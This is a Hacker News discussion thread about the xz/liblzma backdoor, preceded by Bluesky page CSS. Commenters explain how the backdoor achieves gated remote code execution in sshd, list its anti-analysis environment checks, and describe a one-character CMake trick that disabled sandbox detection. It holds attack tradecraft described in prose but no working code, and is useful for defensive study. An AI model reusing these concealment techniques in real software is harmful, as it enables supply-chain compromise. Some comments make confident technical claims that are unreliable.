[
  {
    "id": 39877267,
    "title": "Extending React-Native-Web Reset Stylesheet: Enhancing Web App Styling",
    "originLink": "https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b",
    "originBody": "@filippo.abyssdomain.expert on Bluesky /** * Extend the react-native-web reset: * https://github.com/necolas/react-native-web/blob/master/packages/react-native-web/src/exports/StyleSheet/initialRules.js */ html, body, #root { width: 100%; /* To smooth any scrolling behavior */ -webkit-overflow-scrolling: touch; margin: 0px; padding: 0px; /* Allows content to fill the viewport and go beyond the bottom */ min-height: 100%; } #root { flex-shrink: 0; flex-basis: auto; flex-grow: 1; display: flex; flex: 1; } html { /* Prevent text size change on orientation change https://gist.github.com/tfausak/2222823#file-ios-8-web-app-html-L138 */ -webkit-text-size-adjust: 100%; height: calc(100% + env(safe-area-inset-top)); scrollbar-gutter: stable both-edges; } html, body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Liberation Sans\", Helvetica, Arial, sans-serif; } /* Buttons and inputs have a font set by UA, so we'll have to reset that */ button, input, textarea { font: inherit; line-height: inherit; } /* Color theming */ /* Default will always be white */ :root { --text: black; --background: white; --backgroundLight: hsl(211, 20%, 95%); } /* This gives us a black background when system is dark and we have not loaded the theme/color scheme values in JS */ @media (prefers-color-scheme: dark) { :root { --text: white; --background: black; --backgroundLight: hsl(211, 20%, 20%); color-scheme: dark; } } /* Overwrite those preferences with the selected theme */ html.theme--light { --text: black; --background: white; --backgroundLight: hsl(211, 20%, 95%); } html.theme--dark { --text: white; --background: black; --backgroundLight: hsl(211, 20%, 20%); color-scheme: dark; } html.theme--dim { --text: white; --background: hsl(211, 20%, 4%); --backgroundLight: hsl(211, 20%, 10%); color-scheme: dark; } /* Remove autofill styles on Webkit */ input:autofill, input:-webkit-autofill, input:-webkit-autofill:hover, input:-webkit-autofill:focus, input:-webkit-autofill:active{ -webkit-background-clip: text; -webkit-text-fill-color: var(--text); transition: background-color 5000s ease-in-out 0s; box-shadow: inset 0 0 20px 20px var(--background); background: var(--background); color: var(--text); } /* Force left-align date/time inputs on iOS mobile */ input::-webkit-date-and-time-value { text-align: left; } body { display: flex; /* Allows you to scroll below the viewport; default value is visible */ overflow-y: auto; overscroll-behavior-y: none; text-rendering: optimizeLegibility; background-color: var(--background); -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; -ms-overflow-style: scrollbar; font-synthesis-weight: none; } /* Remove default link styling */ a { color: inherit; } a[role=\"link\"]:hover { text-decoration: underline; } a[role=\"link\"][data-no-underline=\"1\"]:hover { text-decoration: none; } /* Styling hacks */ *[data-word-wrap] { word-break: break-word; } *[data-stable-gutters] { scrollbar-gutter: stable both-edges; } /* ProseMirror */ .ProseMirror { font: 18px -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Liberation Sans\", Helvetica, Arial, sans-serif; min-height: 140px; } .ProseMirror-dark { color: white; } .ProseMirror p { margin: 0; } .ProseMirror p.is-editor-empty:first-child::before { color: #8d8e96; content: attr(data-placeholder); float: left; height: 0; pointer-events: none; } .ProseMirror .mention { color: #0085ff; } .ProseMirror a, .ProseMirror .autolink { color: #0085ff; } /* OLLIE: TODO -- this is not accessible */ /* Remove focus state on inputs */ .ProseMirror-focused { outline: 0; } textarea:focus, input:focus { outline: 0; } .tippy-content .items { width: fit-content; } /* Tooltips */ [data-tooltip] { position: relative; z-index: 10; } [data-tooltip]::after { content: attr(data-tooltip); display: none; position: absolute; bottom: 0; left: 50%; transform: translateY(100%) translateY(8px) translateX(-50%); padding: 4px 10px; border-radius: 10px; background: var(--backgroundLight); color: var(--text); text-align: center; white-space: nowrap; font-size: 12px; z-index: 10; } [data-tooltip]::before { content: ''; display: none; position: absolute; border-bottom: 6px solid var(--backgroundLight); border-left: 6px solid transparent; border-right: 6px solid transparent; bottom: 0; left: 50%; transform: translateY(100%) translateY(2px) translateX(-50%); z-index: 10; } [data-tooltip]:hover::after, [data-tooltip]:hover::before { display:block; } /* NativeDropdown component */ .radix-dropdown-item:focus, .nativeDropdown-item:focus { outline: none; } JavaScript Required This is a heavily interactive web application, and JavaScript is required. Simple HTML interfaces are possible, but that is not what this is. Learn more about Bluesky at bsky.social and atproto.com. Post Filippo Valsorda filippo.abyssdomain.expert did:plc:x2nsupeeo52oznrmplwapppl I&#39;m watching some folks reverse engineer the xz backdoor, sharing some *preliminary* analysis with permission. The hooked RSA_public_decrypt verifies a signature on the server&#39;s host key by a fixed Ed448 key, and then passes a payload to system(). It&#39;s RCE, not auth bypass, and gated/unreplayable. [contains quote post or other embedded content] 2024-03-30T17:13:58.474Z",
    "commentLink": "https://news.ycombinator.com/item?id=39877267",
    "commentBody": "XZ backdoor: \"It's RCE, not auth bypass, and gated/unreplayable.\" (bsky.app)1030 points by junon 15 hours agohidepastfavorite618 comments junon 15 hours agoEDIT: Here's some more RE work on the matter. Has some symbol remapping information that was extracted from the prefix trie the backdoor used to hide strings. Looks like it tried to hide itself even from RE/analysis, too. https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9... Full list of decoded strings here: https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01 -- For someone unfamiliar with openssl's internals (like me): The N value, I presume, is pulled from the `n` field of `rsa_st`: https://github.com/openssl/openssl/blob/56e63f570bd5a479439b... Which is a `BIGNUM`: https://github.com/openssl/openssl/blob/56e63f570bd5a479439b... Which appears to be a variable length type. The back door pulls this from the certificate received from a remote attacker, attempts to decrypt it with ChaCha20, and if it decrypts successfully, passed to `system()`, which is essentially a simple wrapper that executes a line of shellscript under whichever user the process is currently executing. If I'm understanding things correctly, this is worse than a public key bypass (which myself and I think a number of others presumed it might be) - a public key bypass would, in theory, only allow you access as the user you're logging in with. Assumedly, hardened SSH configurations would disallow root access. However, since this is an RCE in the context of e.g. an sshd process itself, this means that sshd running as root would allow the payload to itself run as root. Wild. This is about as bad as a widespread RCE can realistically get. reply jeroenhd 14 hours agoparent> However, since this is an RCE in the context of e.g. an sshd process itself, this means that sshd running as root would allow the payload to itself run as root. With the right sandboxing techniques, SELinux and mitigations could prevent the attacker from doing anything with root permissions. However, applying a sandbox to an SSH daemon effectively is very difficult. reply semiquaver 12 hours agorootparentCould you explain how SELinux could ever sandbox against RCE in sshd? Its purpose is to grant login shells to arbitrary users, after all. reply saltcured 11 hours agorootparentYou could refactor sshd so most network payload processing is delegated to sandboxed sub-processes. Then an RCE there has less capabilities to exploit directly. But, I think you would have to assume an RCE can cause the sub-process to produce wrong answers. So if the answers are authorization decisions, you can transitively turn those wrong answers into RCE in the normal login or remote command execution context. But, the normal login or remote command execution is at least audited. And it might have other enforcement of which accounts or programs are permitted. A configuration disallowing root could not be bypassed by the sub-process. You could also decide to run all user logins/commands under some more confined SE-Linux process context. Then, the actual user sessions would be sandboxed compared to the real local root user. Of course, going too far with this may interfere with the desired use cases for SSH. reply nrdvana 6 hours agorootparentThat just raises the hurdle for the attacker. The attacker in this case has full control to replace any function within ssh with their own version, and the master process of sshd will always need the ability to fork and still be root on the child process before dropping privileges. I don't see any way around that. They only needed to override one function this time, but if you raise the bar they would just override more functions and still succeed. reply tomasGiden 2 hours agorootparentI’m highly safety critical systems you have software (and hardware) diversity were multiple pieces of software, developed independently, have to vote on the result. Maybe highly critical pieces of Linux like the login process should be designed the same way. So that two binaries without common dependencies would need to accept the login for the user to get privileges. Exactly how to do it (especially transparently for the user), I have no idea though. Maybe sending ssh login requests to two different sshd implementations and if they don’t do the same things (same system calls), they are both killed. Or some kind of two step login process where the first login only gives access to the sandbox of the second login process. But in general I assume the Linux attack surface is too big to do software diversity for all of it. reply rigid 1 hour agorootparent> login process RCE doesn't really follow a login process design. As soon as you got RCE you can be considered pwned. If not now, then at the time the next locally exploitable vulnerability comes up. There are plenty. reply lovasoa 4 hours agorootparentprev> The attacker in this case has full control to replace any function within ssh with their own version Not true. They have this ability only for binaries that are linked to liblzma. If sshd were to be decomposed into multiple processes, not all of them would (hopefully) depend on all the libraries that the original sshd depended on. reply asveikau 11 hours agorootparentprevI thought that OpenSSH's sshd already separates itself into a privileged process and a low-privilege process. I don't know any details about that. Here's what Google showed me for that: https://github.com/openssh/openssh-portable/blob/master/READ... reply treasy 10 hours agorootparentIf you look at the diagram of privsep, the authentication process is part of the privileged binary, which is where this RCE lives http://www.citi.umich.edu/u/provos/ssh/priv.jpg reply cryptonector 9 hours agorootparentThe signature validation could be moved into an unprivileged process forked from that one. reply mjg59 8 hours agorootparentIt wouldn't matter in this case, since the exploit could simply rewrite the function that calls out to the unprivileged process. If you already have malicious code in your privileged parent process there's no way to recover from that. reply CanaryLayout 6 hours agorootparentExactly. The attack came in by hitching a ride on to systemd. sshd is not the problem. the ldd/monolith architecture surrounding systemd is. What if I duplicated this attack but instead targeted dbus or any other thing that systemd is managing? reply saagarjha 5 hours agorootparentNo, the problem is that someone had access to backdoor code that runs in a privileged process. reply littlestymaar 9 hours agorootparentprevThat's an easy thing to say after the fact indeed but yes. In fact after such a disastrous backdoor I wouldn't be surprised if OpenSSH moved all code calling external libraries to unprivileged processes to make sure such an attack can never have such a dramatic effect (an auth bypass would still likely be possible, but that's still way better than a root RCE…). At this point “All libraries could be malicious” is a threat model that must be considered for something as security critical as OpenSSH. reply asveikau 7 hours agorootparentI don't think that's a threat model that OpenSSH should waste too much time on. Ultimately this is malicious code in the build machine compiling a critical system library. That's not reasonable to defend against. Keep in mind that upstream didn't even link to liblzma. Debian patched it to do so. OpenSSH should defend against that too? reply CanaryLayout 6 hours agorootparentany one of us if we sat on the OSSH team would flip the middle finger. What code is the project supposed to write when nothing on main dyn loaded liblzma. It was brought in from a patch they don't have realistic control over. This is a Linux problem, and the problem is systemd, which is who brought the lib into memory and init'd it. reply shzhdbi09gv8ioi 24 minutes agorootparent> This is a Linux problem, and the problem is systemd, which is who brought the lib into memory and init'd it. Not at all, it is a distro issue because a few distros such as Debian chose to patch openssh to bring in systemd support [1]. Other systemd-based distros like Arch Linux remains unaffected because they don't carry this patch. 1: https://sources.debian.org/src/openssh/1%3A9.7p1-2/debian/pa... astrange 4 hours agorootparentprevIt is possible to prevent libraries from patching functions in other libraries; make those VM regions unwritable, don't let anyone make them writable, and adopt PAC or similar hardware protection so the kernel can't overwrite them either. reply dotancohen 12 minutes agorootparentThat does not sound like the type of machine that I want to work on. I still require a general purpose computer. rwmj 18 minutes agorootparentprevThat's already done, but in this case the attack happened in a glibc ifunc and those run before the patching protection is enabled (since an ifunc has to patch the PLT). treasy 11 hours agorootparentprevYou can definitely prevent a lot of file/executable accesses via SELinux by running sshd in the default sshd_t or even customizing your own sshd domain and preventing sshd from being able to run binaries in its own domain without a transition. What you cannot prevent though is certain things that sshd _requires_ to function like certain capabilities and networking access. by default sshd has access to all files in /home/$user/.ssh/, but that could be prevented by giving private keys a new unique file context, etc. SELinux would not prevent all attacks, but it can mitigate quite a few as part of a larger security posture reply transpute 10 hours agorootparenthttps://news.ycombinator.com/item?id=39879559 > Libselinux pulls in liblzma too reply treasy 10 hours agorootparentlibselinux is the userspace tooling for selinux, it is irrelevant to this specific discussion as the backdoor does not target selinux in any way, and sshd does not have the capabilities required to make use of the libselinux tooling anyway libselinux is just an unwitting vector to link liblzma with openssh reply ajross 11 hours agorootparentprevIt's possible to spawn a sshd as an unprivileged or partially-capabilitized process. Such as sandbox isn't the default deployment, but it's done often enough and would work as designed to prevent privilege elevation above the sshd process. reply admax88qqq 11 hours agorootparentHow can sshd spawn interactive sessions for other users if it's sandboxed? reply kbolino 11 hours agorootparentSELinux does not rely on the usual UID/GID to determine what a process can do. System services, even when running as \"root\", are running as confined users in SELinux. Confined root cannot do anything which SELinux policy does not allow it to do. This means you can let sshd create new sessions for non-root users while still blocking it from doing the other things which unconfined root would be able to do. This is still a lot of power but it's not the godlike access which a person logged in as (unconfined) root has. reply quotemstr 10 hours agorootparentDoesn't matter. A malicious sshd able to run commands arbitrary users can just run malicious commands as those users. We'd need something more like a cryptographically attested setreuid() and execve() combination that would run only commands signed with the private key of the intended user. You'd want to use a shared clock or something to protect against replay attacks reply kbolino 10 hours agorootparentYes, this won't directly protect against an attacker whose goal is to create a botnet, mine some crypto on your dime, etc. However, it will protect against corruption of the O/S itself and, in tandem with other controls, can limit the abilities an attacker has, and ensure things like auditing are still enforced (which can be tied to monitoring, and also used for forensics). Whether it's worth it or not depends on circumstances. In many cloud environments, nuking the VM instance and starting over is probably easier than fiddling with SELinux. reply CanaryLayout 6 hours agorootparenteven easier is to STOP HOSTING SSHD ON IPV4 ON CLEARNET at minimum, ipv6 only if you absolutely must do it (it absolutely cuts the scans way down) better is to only host it on vpn even better is to only activate it with a portknocker, over vpn even better-better is to set up a private ipv6 peer-to-peer cloud and socat/relay to the private ipv6 network (yggdrasil comes to mind, but there's other solutions to darknet) your sshd you need for server maintenance/scp/git/rsync should never be hosted on ipv4 clearnet where a chinese bot will find it 3 secs after the route is established after boot. reply dvdkon 2 hours agorootparentHow about making ssh as secure as (or more secure than) the VPN you'd put it behind? Considering the amount of vulnerabilities in corporate VPNs, I'd even put my money on OpenSSH today. It's not like this is SSH's fault anyway, a supply chain attack could just as well backdoor some Fortinet appliance. reply alrs 4 hours agorootparentprevWho cares about scans? Who cares if a scan comes in 4 or 6? reply ajross 11 hours agorootparentprevPlausibly by having set-user-ID capability but not others an attacker might need. But in the more common case it just doesn't: you have an sshd running on a dedicated port for the sole purpose of running some service or another under a specific sandboxed UID. That's basically the github business model, for example. reply kbolino 11 hours agorootparentprevEven though sshd must run as root (in the usual case), it doesn't need unfettered access to kernel memory, most of the filesystem, most other processes, etc. However, you could only really sandbox sshd-as-root. In order for sshd to do its job, it does need to be able to masquerade as arbitrary non-root users. That's still pretty bad but generally not \"undetectably alter the operating system or firmware\" bad. reply sweetjuly 10 hours agorootparent>Even though sshd must run as root (in the usual case), it doesn't need unfettered access to kernel memory, most of the filesystem, most other processes, etc This is sort of overlooking the problem. While true, the processes spawned by sshd do need to be able to do all these things and so even if you did sandbox it, preserving functionality would all but guarantee an escape is trivial (...just spawn bash?). reply kbolino 10 hours agorootparentSELinux context is passed down to child processes. If sshd is running as confined root (system_u:system_r:sshd_t or similar), then the bash spawned by RCE will be too. Even if sshd is allowed to masquerade as an unconfined non-root user, that user will (regardless of SELinux) be unable to read or write /dev/kmem, ignore standard file permissions, etc. reply sweetjuly 9 hours agorootparentThat's my point though--users expect to be able to do those things over ssh. Sandboxing sshd is hard because its child processes are expected to be able to do anything that an admin sitting at the console could do, up to and including reading/writing kernel memory. reply kbolino 9 hours agorootparentI'm assuming SSH root login is disabled and sudo requires separate authentication to elevate, but yeah, if there's a way to elevate yourself to unconfined root trivially after logging in, this doesn't buy you anything. Now, sandboxing sudo (in the general case) with SELinux probably isn't possible. reply CanaryLayout 6 hours agorootparentThis does not matter either. The attack came in by loading into systemd via liblzma. It put on a hook and then sits around waiting for sshd to load in so it can learn the symbols then proceeds to swap in the jumps. sshd is a sitting duck. Bifurcating sshd into a multimodule scheme won't work because some part of it still has to be loaded by systemd. This is a web of trust issue. In the .NET world where refection attacks happen to commercial software that features dynload assemblies, the only solution they could come up with is to sign all the things, then box up anything that doesn't have a signing mechanism and then sign that, even signing plain old zip files. Some day we will all have to have keys, and to keep the anon people from leaving they can get an anon key, but anons with keys will never get on the chain where the big distros would ever trust their commits until someone who forked over their passport and photos got a trustable key to sign off on the commits, so that the distro builders can then greenlight pulling it in. Then I guess to keep the anons hopeful that they are still in the SDLC somewhere their commits can go into the completely untrusted-unstable-crazytown release that no instutution in their right mind would ever lay down in production. reply withinboredom 40 minutes agorootparentDo you think state actors won’t just print out random passports? reply LtWorf 1 hour agorootparentprevAnons will just steal identities, and randos will get accused of hacking they didn't do. reply semiquaver 9 hours agorootparentprevI’ll admit to not being an expert in SELinux, but it seems like an impossibly leaky proposition. Root can modify systemd startup files, so just do that in a malicious way and reboot the system. that context won’t be propagated. And if you somehow prohibit root from doing that by SELinux policy then you end up with a system that can’t actually be administered. [edit: sibling sweetjuly said it better than I could. I doubt that this much more than a fig leaf on any real world system given what sshd is required to have to do.] reply treasy 9 hours agorootparentSelinux domains are uncoupled from Linux users. If sshd does not have Selinux permissions to edit those files it will simply be denied. Even if sshd is run as root reply semiquaver 3 hours agorootparentWhich amounts to the un-administerable system I mentioned. If it’s not possible to modify systemd config files using ssh, what happens when you need to edit them? reply kimixa 1 hour agorootparentReally what they're proposing here is a non-modifiable system, where the root is read-only and no user can modify anything important. Which is nice and all, but that implies a \"parent\" system that creates and deploys those systems. Which people likely want remote access to.. Probably by sshd... reply dhx 9 hours agorootparentprevsshd is probably the softest target on most systems. It is generally expected (and setup by default) so that people can gain a root shell that provides unrestricted access. sshd.service will typically score 9.6/10 for \"systemd-analyze security sshd.service\" where 10 is the worst score. When systemd starts a process, it does so by using systemd-nspawn to setup a (usually) restricted namespace and apply seccomp filters before the process is then executed. seccomp filters are inherited by child processes, which can then only further restrict privileges but not expand upon the inherited privileges. openssh-portable on Linux does apply seccomp filters to child processes but this is useless in this attack scenario because sshd is backdoored by the xz library, and the backdoored library can just disable/change those seccomp filters before sshd is executed. sshd is particularly challenging to sandbox because if you were to restrict the namespace and apply strict seccomp filters via systemd-nspawn, a user gaining a root shell via sshd (or wanting to sudo/su as root) is then perhaps prevented from remotely debugging applications, accessing certain filesystems, interacting with network interfaces, etc depending on what level of sandboxing is applied from systemd-nspawn. This choice is highly user dependent and there are probably only limited sane defaults for someone who has already decided they want to use sshd. For example, sane defaults could include creating dedicated services with sandboxing tailored just for read-only sftp user filesystem access, a separate service for read/write sftp user filesystem access, sshd tunneling, unprivileged remote shell access, etc. reply nottorp 2 hours agorootparentSo for all practical purposes you can't sandbox ssh on a developer's machine much. reply onedognight 13 hours agorootparentprev> With the right sandboxing techniques, SELinux and mitigations could prevent the attacker from doing anything with root permissions. Please review this commit[0] where the sandbox detection was “improved”. [0] https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2... reply dolmen 11 hours agorootparentI can't blame anyone who has missed that dot dissimulated at the beginning of the line. https://git.tukaani.org/?p=xz.git;a=commitdiff;h=f9cf4c05edd... reply Muromec 11 hours agorootparentI specifically opened this diff to search for a sneaky dot, knowing it’s there, and wasn’t able to find it until I checked the revert patch reply gouggoug 11 hours agorootparentprevFor people like me whose C knowledge is poor, can you explain why this dot is significant? What does it do in actuality? reply Denvercoder9 11 hours agorootparentIt's part of a test program used for feature detection (of a sandboxing functionality), and causes a syntax error. That in turn causes the test program to fail to compile, which makes the configure script assume that the sandboxing function is unavailable, and disables support for it. reply loumf 11 hours agorootparentprevYou are looking at a makefile, not C. The C code is in a string that is being passed to a function called `check_c_source_compiles()`, and this dot makes that code not compile when it should have -- which sets a boolean incorrectly, which presumably makes the build do something it should not do. reply nurple 9 hours agorootparentInteresting that validating the failure reason of an autotools compile check could be a security mitigation... reply paulmd 2 hours agorootparentThis is something that should have unit/integration tests inside the tooling itself, yeah. If your assertion is that X function is called / in the environment X then the function should return Y then that should be a test especially when it’s load-bearing for security. And tooling is no exception either. You should have tests that your tooling does the things it says on the tin and that things happen when flags are set and things don’t happen when they’re not set, and that the tooling sets the flags in the way you expect. These aren’t even controversial statements in the JVM world etc. Just C tooling is largely still living in the 70s apart from abortive attempts to build the jenga tower even taller like autotools/autoconf/cmake/etc (incomprehensible, may god have mercy on your build). At least hand written make files are comprehensible tbh. reply saagarjha 5 hours agorootparentprevCmake actually but yes reply ezekg 11 hours agorootparentprevAs far as I can tell, the check is to see if a certain program compiles, and if so, disable something. The dot makes it so that it always fails to compile and thus always disables that something. reply _nalply 42 minutes agorootparent> if a certain program compiles, and if so, disable something. Tiny correction: [...] enable something. The idea is: If that certain program does not compile it is because something is not available on the system and therefore needs to be disabled. That dot undermines that logic. The program fails because of a syntax error caused by the dot and not because something is missing. It is easy to overlook because that dot is tiny and there are many such tests. I had a similar problem with unit testing of a library. Expected failures need to be tested as well. As an example imagine writing a matrix inversion library. Then you need to verify that you get something like a division by zero error if you invert the zero matrix. You write a unit test for that and by mistake you insert a syntax error. Then you run the unit test and it fails as expected but not in the correct way. It's subtle. It fails as expected but it fails because of unexpected wrong causes. The solution: Check the errors carefully! reply Denvercoder9 13 hours agorootparentprevThat one's a separate attack vector, which is seemingly unused in the sshd attack. It only disables sandboxing of the xzdec(2) utility, which is not used in the sshd attack. reply formerly_proven 11 hours agorootparentWhich strongly suggests that they planned and/or executed more backdoors via Jia Tan’s access. reply pja 11 hours agorootparentI guess xzdec was supposed to sandbox itself where possible so they disabled the sandbox feature check in the build system so that future payload exploits passed to xzdec wouldn’t have to escape the sandbox in order to do anything useful? Sneaky. reply db48x 5 hours agorootparentprevYes, but don't forget that there are different kinds of sandboxes. SELinux never needs the cooperation of any program running on the system in order to correctly sandbox things. No change to Xz could ever make SELinux less effective. reply glandium 12 hours agorootparentprevOh, that one is interesting, because it only breaks it in cmake. reply sn 11 hours agorootparentI wonder if there is anything else cmake related that should be looked at. Wasn't cmake support originally added to xz to use with Windows and MSVC? reply glandium 11 hours agorootparentBut that's a check for a Linux feature. So the more interesting question would be, what in the Linux world might be building xz-utils with cmake, I guess using ExternalProject_Add or something similar. reply sn 10 hours agorootparentYes this is Linux. At this time we don't know exactly how much is affected and what originally drew the attention of the attacker(s). reply ronsor 13 hours agorootparentprevWell, the definition of \"improve\" depends on one's goals. reply junon 14 hours agorootparentprevRight, though if I'm understanding correctly, this is targeting openssl, not just sshd. So there's a larger set of circumstances where this could have been exploited. I'm not sure if it's yet been confirmed that this is confined only to sshd. reply jeroenhd 14 hours agorootparentThe exploit, as currently found, seems to target OpenSSH specifically. It's possible that everything involving xz has been compromised, but I haven't read any reports that there is a path to malware execution outside of OpenSSH. A quote from the first analysis that I know of (https://www.openwall.com/lists/oss-security/2024/03/29/4): > Initially starting sshd outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked. This appears to be part of some countermeasures to make analysis harder. > a) TERM environment variable is not set > b) argv[0] needs to be /usr/sbin/sshd > c) LD_DEBUG, LD_PROFILE are not set > d) LANG needs to be set > e) Some debugging environments, like rr, appear to be detected. Plain gdb appears to be detected in some situations, but not others reply cryptonector 9 hours agorootparentprevThis is what PrivSep was supposed to do. sshd could fork an unprivileged and restricted process to do the signature validation, I suppose. reply quotemstr 10 hours agorootparentprevDoesn't matter. This is a supply chain attack, not a vulnerability arising from a bug. All sandboxing the certificate parsing code would have done is make the author of the backdoor do a little bit more work to hijack the necessarily un-sandboxed supervisor process. Applying the usual exploit mitigations to supply chain attacks won't do much good. What will? Kill distribution tarballs. Make every binary bit for bit reproducible from a known git hash. Minimize dependencies. Run whole programs with minimal privileges. Oh, and finally support SHA2 in git to forever forestall some kind of preimage attack against a git commit hash. reply nurple 9 hours agorootparentOh boy, do I have the packaging system for you! reply hellcow 13 hours agorootparentprevAnother reason to adopt OpenBSD style pledge/unveil in Linux. reply somat 12 hours agorootparentWould that help? sshd, by design, opens shells. the backdoor payload was basically to open a shell. that is, the very thing that sshd has to do. The pledge/unvail system is pretty great, but my understanding is that it do not do anything that the linux equivalent interfaces(seccomp i think) cannot do. It is just a simplified/saner interface to the same problem of \"how can a program notify the kernel what it's scope is?\" The main advantage to pledge/unveil bring to the table is that they are easy to use and cannot be turned off, optional security isn't. reply tootie 10 hours agoparentprevMind boggling. How do you even decide what to do with privileges on a billion computers? reply junon 10 hours agorootparentThere's a reasonably high chance this was to target a specific machine, or perhaps a specific organization's set of machines. After that it could probably be sold off once whatever they were using it for was finished. I doubt we'll ever know the intention unless the ABC's throw us a bone and tell us the results of their investigation (assuming they're not the ones behind it). reply cmcaleer 11 minutes agorootparentClassic example of this being Stuxnet, a worm that exploited four(!) different 0-days and infected hundreds of thousands of computers with the ultimate goal of destroying centrifuges associated with Iran’s nuclear program. reply ddalex 32 minutes agorootparentprevI'd disagree, based on reports of the actor trying to get this upstreamed in Debian and Fedora. Widespread net. reply BbzzbB 48 minutes agorootparentprevABC? reply tau255 43 minutes agorootparent3 letter intelligence agencies. reply aaronmdjones 26 minutes agorootparentBaw, GCHQ is going to feel so left out. reply az226 27 minutes agorootparentprevNSA, CIA, FBI, DHS. reply kortilla 2 hours agorootparentprevThere aren’t a billion computers running ssh servers and the ones that do should not be exposed to the general internet. This is a stark reminder of why defense in depth matters. reply sega_sai 12 hours agoprevOne have question on this is, if the backdoor would not been discovered due to performance issue (which was as I understood it purely an oversight/fixable deficiency in the code), what are the chances of discovering this backdoor later, or are there tools that would have picked it up? Those questions are IMO relevant to understand if this kind of backdoor is the first one of the kind, or the first one that was uncovered. reply xlii 2 hours agoparentWorking for about a year in an environment that was exposed to high volume of malevolent IT actors (and some pretty scary ones) I’d say: discovery chances very always pretty high. Keeping veil of secrecy requires unimaginable amount of energy. Same goes with truth consistency. One little slip and everything goes to nothing. Sometimes single sentence can start a chain of reaction and uncover meticulous crafted plan. That’s how crime if fought every day. Whereas police work has limited resources, software is analyzed daily by hobbyists as a hobby, professionals who still do it for a hobby, and professionals for professional reasons. Discovery was bound to happen eventually. XZ attack was very well executed. It’s a master piece. I wouldn’t be surprised if some state agencies would be involved. But it also was incredibly lucky. I know for sure for myself, but also many of my colleagues would go into long journey if found any of issues that are flagged right now. One takeaway is that chance of finding such issue would be impossible if xz/liblzma wouldn’t be open source (and yes I am also aware it enabled it in the first place) but imagine this existing in Windows or MacOS. reply rigid 1 hour agorootparent> it enabled it in the first place it took roughly two years including social engineering. I'd say the same approach is much easier in a big software company. reply lazyasciiart 1 hour agorootparentHow do you mean? reply rigid 41 minutes agorootparentI bet in the majority of cases, there's no need to pressure for merging. In a big company it's much easier to slip it in. Code seemingly less relevant for security is often not reviewed by a lot of people. Also, often people don't really care and just sign it off without a closer look. And when it's merged, no one will ever look at it again, other than with FOSS. reply quatrefoil 11 hours agoparentprevIf the exploit wasn't baing used, the odds would would be pretty low. They picked the right place to bury it (i.e., effectively outside the codebase, where no auditor ever looks). That said, if you're not using it, it defeats the purpose. And the more you're using it, the higher the likelihood you will be detected down the line. Compare to Solarwinds. reply londons_explore 10 hours agorootparentI suspect I could have used this exact attack against 10,000 random SSH servers spread all over the world, and not be detected. Most people don't log TCP connections, and those that do don't go through their logs looking for odd certificates in ssh connections. And no common logging at the ssh/pam level would have picked this up. Your only chance is some sysadmin who has put 'tripwires' on certain syscalls like system(), fork() or mmap() looking for anything unusual. Even then, they might detect the attack, yet have no chance at actually finding how the malicious code loaded itself. reply amscanne 9 hours agorootparentThere is no ‘system()’ syscall, and fork/exec would be extremely common for opensshd — it’s what it does to spawn new shells which go on to do anything. I’m not arguing with the point, but this is a great place to hide — very difficult to have meaningful detection rules even for a sophisticated sysadmin. reply ivlad 5 hours agorootparentThis would be execve() that did not go through PAM dance and end up being privileged process. I _think_ it’ll look very different in ps —-forest output. reply amscanne 4 hours agorootparentIt’s true that there’s a precise set of circumstances that would be different for the RCE (the lack of a PAM dance prior, same process group & session, no allocation of a pseudo-terminal, etc.). My point was merely that I don’t think they are commonly encoded in rule sets or detection systems. It’s certainly possible, but my guess is sshd is likely to have a lot of open policy. I’m really curious if someone knows different and there are hard detection for those things. (Either way, I bet there will be in the future!) reply ivlad 3 hours agorootparentI am trying to figure out if auditctl is expressive enough to catch unexpected execve() from sshd: basically anything other than /usr/bin/sshd (for privsep) executed with auid=-1 should be suspicious. reply guenthert 1 hour agorootparentprevThere are those who run sshd on a non-standard port and log all attempts to connect to the standard port though. reply matrix_overload 9 hours agorootparentprevWith sufficient data points, you can do A/B and see that all affected systems run a specific version of Linux distro, and eventually track it down to a particular package. reply bastawhiz 7 hours agorootparentUnless you're the bad actor, you have no way to trigger the exploit, so you can't really do an a/b test. You can only confirm which versions of which distros are vulnerable. And that assumes you have sufficient instrumentation in place to know the exploit has been triggered. Even then, who actually has a massive fleet of publicly exposed servers all running a mix of distros/versions? You might run a small handful of distros, but I suspect anyone running a fleet large enough to actually collect a substantial amount of data probably also has tools to upgrade the whole fleet (or at least large swaths) in one go. Certainly there are companies where updates are the wild west, but the odds that they're all accessible to and controllable by a single motivated individual who can detect the exploit is essentially zero. reply lll-o-lll 7 hours agorootparentprev> That said, if you're not using it, it defeats the purpose. Not if this was injected by a state actor. My experience with other examples of state actor interference in critical infrastructure, is that the exploit is not used. It’s there as a capability to be leveraged only in the context of military action. reply sunshine_reggae 39 minutes agorootparentAnd that leads to the question: Why do non-friendly state actors (apparently) not detect and eliminate exploits like this one? Supposedly, they should have the same kind of budgets for code review (or even more, if we combine all budgets of all non-friendly state actors, given the fact that we are talking about open-source code). reply phire 5 minutes agorootparentHow to you know they don't? When a state actor says \"We found this exploit\", people will get paranoid and wondering if the fix is actually an exploit. Not saying it happened in this case, but it's really easy for a state actor to create a cover story (pretending to be a random user who noticed ssh logins being slow) and pointing all the maintainers to the problem, without revealing the true identity of who found it. reply rigid 1 hour agorootparentprev> where no auditor ever looks Well, software supply chains are a thing. \"where no auditor ever is paid to look\" would be more correct. reply bandrami 5 hours agorootparentprevThe purpose would presumably be to use this about an hour before the amphibious assault on $WHEREVER begins reply guenthert 1 hour agorootparentprevHmmh, brings up the question, if no exploit actually occurred, was a crime committed? Can't the authors claim that they were testing how quickly the community of a thousand eyes would react, you know, for science? reply NekkoDroid 1 hour agorootparentThat's like asking if someone that went into a crowded place with a full-automatic and started shooting at people but \"purposefully missing\" is just testing how fast law enforcement reacts, you know, for science. After something like 2 years of planning this out and targeted changes this isn't something \"just done for science\". reply golergka 8 hours agorootparentprev> That said, if you're not using it, it defeats the purpose. Not always. Weapons of war are most useful when you don't have to actually use them, because others know that you have it. This exploit could be used sparingly to boost a reputation of a state-level actor. Of course, other parties wouldn't know about this particular exploit, but they would see your cyber capabilities in the rare occasions where you decided to use it. 